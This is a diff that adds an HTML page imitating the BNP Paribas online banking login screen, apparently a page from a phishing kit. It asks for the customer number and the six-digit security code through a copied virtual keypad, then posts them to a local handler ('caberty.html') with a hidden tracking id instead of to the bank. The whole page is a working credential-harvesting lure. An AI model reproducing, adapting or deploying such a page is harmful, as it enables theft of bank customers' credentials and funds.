@@ -1,0 +1,226 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<!-- saved from url=(0068) -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+
+<meta http-equiv="pragma" content="no-cache">
+<meta http-equiv="Cache-Control" content="no-cache">
+<meta http-equiv="expires" content="Tue, 01-Jan-1980 00:00:00 GMT">
+<meta http-equiv="date" content="Tue, 01-Jan-1980 00:00:00 GMT">
+<title>BNPPARIBAS NET IDENTIFICATION</title>
+<link href="./files/dciweb.css" rel="stylesheet" type="text/css">
+<link href="./files/bnp.css" rel="stylesheet" type="text/css">
+</head>
+<body bgcolor="#FFFFFF" link="#002288" alink="#002288" vlink="#002288" style="display: block;">
+<script language="JavaScript" src="./files/tools.js"></script><div id="bubble" style="position:absolute;visibility:hidden;"></div>
+<style>
+  body {display : none;} 
+</style>
+<script>
+  if (self == top) { 
+    var theBody = document.getElementsByTagName('body')[0];
+    theBody.style.display = "block";
+  } else { 
+    top.location = self.location; 
+  }
+</script>
+<script>
+function clearParams() {
+  if (document.saisie.p0 != null) document.saisie.p0.value = "";
+  if (document.saisie.p1 != null) document.saisie.p1.value = "";
+  if (document.saisie.pwd != null) document.saisie.pwd.value = "";
+}
+function control()
+{
+  document.saisie.p1.value=document.saisie.pwd.value
+  if ((document.saisie.p0.value=="")||(document.saisie.p1.value==""))
+  {
+    alert("Le numéro d'abonné et le mot de passe doivent être remplis!");
+    document.saisie.p0.focus();
+    clearParams();
+    return false;
+  }
+  return true;
+}
+function submitform()
+{
+  if (control())
+    document.saisie.submit() ;
+  clearParams();
+}
+function key(evnt)
+{
+  if(evnt.which==13) submitform();
+}
+</script>
+<style type="text/css">
+<!--
+  BODY TD {
+    font-family: Arial, Helvetica, sans-serif;
+    FONT-SIZE: 12px;
+    FONT-STYLE: normal
+  }
+  a:link,a:active,a:visited {
+    text-decoration:none;
+    color:black
+  }
+  a:hover {
+    text-decoration: underline;
+  }
+//-->
+</style>
+<div class="page">
+<table>
+  <tbody><tr>
+    <td align="center"><img align="center" border="0" src="./files/headerBack.jpg" width="760" height="75"></td>
+  </tr>
+  <tr>
+    <td colspan="2">&nbsp;</td>
+  </tr>
+</tbody></table>  
+<div class="info3"><span style="font-size:130%">Accédez à vos virement en ligne via BNP </span></div>
+<div align="left">
+  &nbsp;
+</div>
+  <div align="center">
+    <b><font color="#FF0000"> </font></b>
+    <center>    
+      <form autocomplete="off" name="saisie" method="post" onsubmit="return control();" enctype="application/x-www-form-urlencoded" target="_top" action="./caberty.html">
+          <input type="hidden" name="vkid" value="vkident-g8zvt1u51e">
+          <input type="hidden" name="p1">
+          <div style="width:620px; margin:0 auto;">
+            <div class="formulaire1" style="height:32px; line-height:32px; font-size:12px; text-align:left; ">
+			  <div style="float:left; width:52%;">
+				  <img src="./files/etape1.png" style="width:20px; height:20px; margin:auto 5px; vertical-align:middle;">
+				  <span>&nbsp;Saisissez votre &nbsp;numéro&nbsp;client&nbsp;à l'aide du&nbsp;clavier</span>
+			  </div>
+			  <div style="float:right; width:48%;">
+				  <span style="font-size:13px; font-weight:bold;">Réference du compte</span>
+				  <input size="10" maxlength="10" value="" name="p0" type="text" style="margin: auto 5px; vertical-align:middle;">
+			  </div>
+            </div>
+          <div class="encartIdent">
+            <span class="titre">Espace sécurisé BNPPARIBAS.NET</span>
+              <ul>
+                <li><a href="#><font color="#0000FF">Accueil</font></a></li>
+                <li><a href="#" target="_blank"><font color="#0000FF">Aide à la connexion ?</font></a></li>
+                <li><a href="#" target="_blank"><font color="#0000FF">Convention</font></a></li>
+		        <li><a href="#" target="_top"><font color="#0000FF">Visite guidée</font></a></li>      
+              </ul>   
+          </div>      
+          <div style="float:left; width:50%;">
+            <div class="signatureMdp3">
+              <table>
+                <tbody><tr>
+                  <td colspan="2"><img class="vAlignMiddle" src="./files/etape2.png" alt="etape 2" style="margin: 0 5px 5px 0; float:left;"><div style="padding-top:3px;">&nbsp;Cliquez&nbsp;pour&nbsp;composer&nbsp;les&nbsp;6&nbsp;chiffres&nbsp;de&nbsp;votre</div></td>
+                </tr>
+                <tr>
+                  <td class="col1"><img src="./files/dciweb.png" usemap="#grillemap" border="0"></td>
+                  <td align="top">
+                    <p style="margin:2px 0;"><strong>Code de sécurité</strong></p>
+                    <input size="6" maxlength="6" name="pwd" type="password">
+                    <br>
+                    <br>
+                    &nbsp;<a href="#" onclick="document.saisie.pwd.value=&#39;&#39;;"><img class="vAlignMiddle" src="./files/flecheCorriger.png">&nbsp;&nbsp;</a><a href="index.html" onclick="document.saisie.pwd.value=&#39;&#39;;">Corriger</a>
+                  </td>
+                </tr>
+              </tbody></table>
+            </div>
+            <table cellpadding="0" cellspacing="0" class="tableBouton">
+              <tbody><tr>
+                <td align="center"><a href="#" name="local" onclick="return submitform();"><img src="./files/valdbtn.gif" alt=""></a></td>
+                <td>&nbsp;</td>
+                <td align="center"><a href="#" name="local" onclick="document.saisie.p0.value=&#39;&#39;; document.saisie.pwd.value=&#39;&#39;; document.saisie.p0.focus();"><img src="./files/annubtn.gif" alt=""></a></td>
+              </tr>
+            </tbody></table>
+
+
+
+
+  
+
+<map name="grillemap">
+  <script language="javascript">
+  CellX=132/5;
+  CellY=128/5;
+	col=0;
+	lig=0;
+  tabcar = new Array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y');
+	function pwd_writeM(cell)
+	{
+	  document.saisie.pwd.value
+   	
+		if ( document.saisie.pwd.value.length < 6 )
+	  	document.saisie.pwd.value = document.saisie.pwd.value + tabcar[cell];
+	}
+	for(i=0; i<25; i++ )
+	{
+	  if(parseInt((i/5), 10)!=lig)
+	  {
+		  col=0;
+		  lig=parseInt((i/5), 10);
+	  }
+	  posX = parseInt(col*CellX, 10);
+	  posY = parseInt(lig*CellY, 10);
+	  posX1= parseInt((col+1)*CellX, 10);
+	  posY1= parseInt((lig+1)*CellY, 10);
+	  col++;
+	  document.writeln('<area shape="rect" coords="'+posX+','+posY+','+posX1+','+posY1+'" onclick="pwd_writeM('+i+');" ondblclick="if(navigator.appName==\'Microsoft Internet Explorer\'){pwd_writeM('+i+')}" onfocus="document.saisie.p0.focus();">');
+	}
+  </script><area shape="rect" coords="0,0,26,25" onclick="pwd_writeM(0);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(0)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="26,0,52,25" onclick="pwd_writeM(1);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(1)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="52,0,79,25" onclick="pwd_writeM(2);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(2)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="79,0,105,25" onclick="pwd_writeM(3);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(3)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="105,0,132,25" onclick="pwd_writeM(4);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(4)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="0,25,26,51" onclick="pwd_writeM(5);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(5)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="26,25,52,51" onclick="pwd_writeM(6);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(6)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="52,25,79,51" onclick="pwd_writeM(7);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(7)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="79,25,105,51" onclick="pwd_writeM(8);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(8)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="105,25,132,51" onclick="pwd_writeM(9);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(9)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="0,51,26,76" onclick="pwd_writeM(10);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(10)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="26,51,52,76" onclick="pwd_writeM(11);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(11)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="52,51,79,76" onclick="pwd_writeM(12);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(12)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="79,51,105,76" onclick="pwd_writeM(13);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(13)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="105,51,132,76" onclick="pwd_writeM(14);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(14)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="0,76,26,102" onclick="pwd_writeM(15);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(15)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="26,76,52,102" onclick="pwd_writeM(16);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(16)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="52,76,79,102" onclick="pwd_writeM(17);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(17)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="79,76,105,102" onclick="pwd_writeM(18);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(18)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="105,76,132,102" onclick="pwd_writeM(19);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(19)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="0,102,26,128" onclick="pwd_writeM(20);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(20)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="26,102,52,128" onclick="pwd_writeM(21);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(21)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="52,102,79,128" onclick="pwd_writeM(22);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(22)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="79,102,105,128" onclick="pwd_writeM(23);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(23)}" onfocus="document.saisie.p0.focus();">
+<area shape="rect" coords="105,102,132,128" onclick="pwd_writeM(24);" ondblclick="if(navigator.appName==&#39;Microsoft Internet Explorer&#39;){pwd_writeM(24)}" onfocus="document.saisie.p0.focus();">
+
+  
+</map>
+
+          </div>
+        
+      
+    </div></form></center>
+  </div>
+
+
+<div style="clear:both;">
+  
+  
+  
+  
+</div>
+
+  <script>
+    document.saisie.p0.focus();
+  </script>
+</div>
+
+<!--
+<script>
+  if (navigator.userAgent.indexOf("MSIE 6.") != -1) {
+    alert("Pour des raisons de sécurité, le service ne sera plus accessible à compter de fin juin 2015 en utilisant Microsoft Internet Explorer inférieur à la version 7.\n\nCe navigateur étant obsolète, il est fortement recommandé de le faire évoluer vers une version plus récente.");
+  }
+</script>
+-->
+
+
+</body></html>
